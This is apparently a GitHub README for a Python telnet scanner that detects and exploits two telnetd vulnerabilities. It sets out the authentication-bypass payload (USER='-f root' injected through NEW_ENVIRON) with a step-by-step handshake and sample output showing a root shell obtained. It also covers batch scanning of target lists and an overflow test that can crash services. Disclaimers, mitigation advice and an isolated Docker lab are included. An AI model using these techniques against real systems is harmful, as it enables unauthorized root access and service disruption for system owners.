# Telnet Vulnerability Scanner (CVE-2026-24061 & CVE-2026-32746)

[![License:ek0ms](https://img.shields.io/badge/ek0ms-savi0r-yellow.svg)](https://github.com/ekomsSavior)

A Python-based security assessment tool that detects and (where applicable) exploits two critical vulnerabilities in GNU InetUtils telnetd:

- **CVE-2026-24061** – Authentication bypass via `USER` environment variable injection (CVSS 9.8)
- **CVE-2026-32746** – Pre-authentication buffer overflow in LINEMODE SLC handler (CVSS 9.8)

## Important Disclaimer

**This tool is for authorized security testing and educational purposes only.**  
Unauthorized use against systems you do not own or have explicit permission to test is illegal. The authors assume no liability for misuse or damage caused by this tool. Use at your own risk.

![image1(1)](https://github.com/user-attachments/assets/9530f820-3e9e-42c1-b442-8a4903e2b760)

## Features

- **Single target scanning** – Enter IP addresses or domain names at runtime
- **Batch scanning** – Upload a file containing multiple targets (one per line)
- **Selective testing** – Test either vulnerability individually or both
- **CVE-2026-24061 exploitation** – If vulnerable, the tool drops you into an interactive root shell directly in the same terminal
- **CVE-2026-32746 detection** – Identifies vulnerable systems via controlled crash detection
- **Clean terminal handling** – Raw mode shell with proper restoration on exit
- **Connection validation** – Distinguishes between filtered ports, offline services, and actual vulnerabilities
- **Verbose debugging** – Set `TELNET_SCAN_VERBOSE=1` to see every IAC packet and step-by-step exploit narrative
- **Docker lab environment** – Self-contained vulnerable target for safe testing

## Installation

```bash
git clone https://github.com/ekomsSavior/telnet_scan.git
cd telnet_scan
chmod +x telnet_scanner.py
```

## Usage

### Basic Execution

```bash
python3 telnet_scanner.py
```

### Docker Lab (Safe Testing)

Test the exploit against a known vulnerable target without risking real systems:

```bash
cd lab
docker compose up -d
cd ..
python3 telnet_scanner.py
# Target: 127.0.0.1, Port: 2323
```

The lab runs a vulnerable GNU InetUtils 2.5 telnetd in an isolated container, bound only to localhost. No network exposure.

### Verbose Mode

Debug the telnet handshake and see exactly what's happening on the wire:

```bash
TELNET_SCAN_VERBOSE=1 python3 telnet_scanner.py
```

Verbose output shows:
- Every IAC command (DO/WILL/SB) sent and received
- Decoded telnet option names
- Payload hex dumps for subnegotiations
- Step-by-step exploit flow (6-step handshake)

![IMG_2498](https://github.com/user-attachments/assets/c9730ed7-60dc-44cb-9edf-0cda187ae9f3)

### Single Target Workflow

1. Choose option `1`
2. Enter target (IP or domain, e.g., `192.168.1.100` or `example.com`)
3. Specify port (default is `23` if left empty)
4. Select test type:
   - `1` – Both vulnerabilities
   - `2` – Only CVE-2026-24061 (authentication bypass)
   - `3` – Only CVE-2026-32746 (buffer overflow)

### Batch Scanning Workflow

1. Create a file with targets (one per line)
   Example `targets.txt`:
   ```
   192.168.1.100
   192.168.1.101
   10.0.0.50
   example.com
   # This is a comment line - ignored
   ```
2. Choose option `2`
3. Enter the filename
4. Specify port (default is `23`)
5. Select test type (1, 2, or 3)
6. The scanner will:
   - Show progress for each target
   - Display results as they complete
   - Provide a summary table at the end

### When a Shell is Obtained

If CVE-2026-24061 succeeds:
1. The vulnerability is detected
2. An interactive root shell appears **directly in the same terminal window**
3. Type commands and see output immediately (e.g., `id`, `whoami`, `ls`)
4. Press `Ctrl+C` to exit the shell and return to the scanner menu
5. For batch scans, you'll be prompted whether to interact with the shell or continue scanning

No separate terminal or extra steps required.

## How It Works

### CVE-2026-24061 – Authentication Bypass

The exploit follows a precise 6-step telnet handshake to ensure compatibility with real GNU InetUtils telnetd:

1. **Wait for server negotiation** – Up to 15 seconds for reverse DNS and initial `DO` options
2. **Respond WILL** – Acknowledge `TTYPE`, `TSPEED`, `XDISPLOC`, `NEW_ENVIRON`
3. **Wait for SB SEND** – Subnegotiation requests from the server
4. **Send exploit payload** – Set `USER="-f root"` via `NEW_ENVIRON` subnegotiation
5. **Handle remaining exchanges** – Respond to `DO`/`WILL` for `SGA`, `ECHO`, `LINEMODE`, `NAWS`
6. **Detect shell** – Look for `# `, `root@`, or `$ ` prompt

A keepalive thread sends `IAC NOP` every 2 seconds to prevent telnetd's `ttloop()` from detecting EOF and calling `exit(1)` before the payload is processed.

Vulnerable telnetd passes `-f root` to `/usr/bin/login`, bypassing authentication and granting immediate root shell access.

### CVE-2026-32746 – Buffer Overflow Detection

- Negotiates the `LINEMODE` option (RFC 1184)
- Sends 500+ SLC triplets (1500+ bytes) to overflow the fixed-size buffer
- Monitors for connection resets/crashes to confirm vulnerability

### Connection Validation

- Pre-scans to verify service availability before attempting exploits
- Distinguishes between:
  - Filtered ports (firewall blocking)
  - Offline services (no service running)
  - Vulnerable services (successful exploit)

## Sample Output

### Single Target
```
=== Telnet Vulnerability Scanner ===
1. Scan a single target
2. Scan targets from file (one IP/hostname per line)
3. Exit

Choose option: 1
Port (default 23): 

Which tests to run?
1. Both
2. Only CVE-2026-24061 (auth bypass - gives shell if vulnerable)
3. Only CVE-2026-32746 (buffer overflow detection)
Choice [1-3]: 1
Target (IP or domain): 192.168.1.100

[*] Resolved 192.168.1.100 -> 192.168.1.100
[*] Scanning 192.168.1.100:23...

[*] Checking if service is reachable...
[+] Service reachable

[*] Testing CVE-2026-24061 (authentication bypass)...
[!] CVE-2026-24061: VULNERABLE – shell obtained!

============================================================
[+] ROOT SHELL OBTAINED! You are now in an interactive root shell.
[+] Type commands directly here. Press Ctrl+C to exit shell.
============================================================

id
uid=0(root) gid=0(root) groups=0(root)
```

### Verbose Mode Output (Partial)
```
    [STEP 1/6] Waiting for server negotiation (may take up to 15s)...
    [STEP 1/6] Got 48 bytes: fffb18fffb20fffb23fffb27...
           decoded: IAC DO TERMINAL-TYPE
           decoded: IAC DO TERMINAL-SPEED  
           decoded: IAC DO X-DISPLAY-LOCATION
           decoded: IAC DO NEW-ENVIRON
    [STEP 2/6] Responding WILL to all DO options
    [STEP 3/6] Waiting for SB SEND subnegotiation requests...
    [STEP 4/6] Sending subnegotiation responses...
               NEW-ENVIRON IS VAR USER VALUE "-f root"  *** EXPLOIT ***
    [STEP 5/6] Handling remaining option negotiations...
    [STEP 5/6] Text received: 'root@vuln-lab:~# '
    [RESULT] SUCCESS: Passwordless root login via USER="-f root" injection
```

### Batch Scan
```
=== Telnet Vulnerability Scanner ===
1. Scan a single target
2. Scan targets from file (one IP/hostname per line)
3. Exit

Choose option: 2
Port (default 23): 
Enter filename with targets (one per line): targets.txt

Which tests to run?
1. Both
2. Only CVE-2026-24061 (auth bypass - gives shell if vulnerable)
3. Only CVE-2026-32746 (buffer overflow detection)
Choice [1-3]: 1

[*] Loaded 3 targets from targets.txt

==================================================
[1/3] Scanning 192.168.1.100:23
==================================================
[*] Resolved 192.168.1.100 -> 192.168.1.100
[+] Service reachable

[*] Testing CVE-2026-24061...
[!] CVE-2026-24061: VULNERABLE – shell obtained!

[?] Shell obtained! Interact now? (y/N): n

[*] Testing CVE-2026-32746...
[+] Server did not crash; likely not vulnerable

==================================================
[2/3] Scanning 192.168.1.101:23
==================================================
[-] Service not reachable on 192.168.1.101:23

==================================================
[3/3] Scanning example.com:23
==================================================
[*] Resolved example.com -> 93.184.216.34
[+] Service reachable

[*] Testing CVE-2026-24061...
[+] No response received; may still be vulnerable

[*] Testing CVE-2026-32746...
[!] CVE-2026-32746: VULNERABLE (server crashed)

============================================================
SCAN SUMMARY
============================================================
192.168.1.100: VULNERABLE to CVE-2026-24061
192.168.1.101: Service unreachable
example.com: VULNERABLE to CVE-2026-32746
============================================================
```

## Mitigation

If you discover vulnerable systems, apply these fixes:

1. **Upgrade GNU InetUtils** to version 2.8 or later
2. **Disable telnetd** and block TCP/23 at network boundaries
3. **Restrict access** to trusted networks only
4. **Monitor logs** for connections with `NEW_ENVIRON USER` values starting with `-f`

## Development & Testing

### Docker Lab

The included `lab/` directory provides a safe, reproducible test environment:

```bash
cd lab
docker compose up -d
# Wait ~10 seconds for telnetd to initialize
python3 ../telnet_scanner.py
# Target: 127.0.0.1, Port: 2323
```

Lab features:
- GNU InetUtils 2.5 compiled from source (vulnerable versions)
- Runs telnetd inside an isolated container
- Bound only to localhost:2323 – safe for development
- Includes a test user (`labuser:labpass123`) for debugging

Stop the lab when finished:
```bash
cd lab && docker compose down
```

## Known Limitations

- The overflow test (CVE-2026-32746) may crash the target telnetd service
- Arrow keys and terminal resizing are not fully supported in the interactive shell
- Some firewalls or network configurations may interfere with Telnet option negotiation
- Windows users: The interactive shell requires a Unix-like terminal (WSL, Cygwin, or Linux/macOS)

![image0(2)](https://github.com/user-attachments/assets/86cde5ca-545d-455c-8110-66515f192af3)

## Acknowledgments

**Special thanks to [@leetcrypt](https://github.com/leetcrypt)** – The proper 6-step handshake, keepalive thread, verbose mode, and Docker lab is killa!

---

DISCLAIMER: for authorized security testing and educational purposes only.
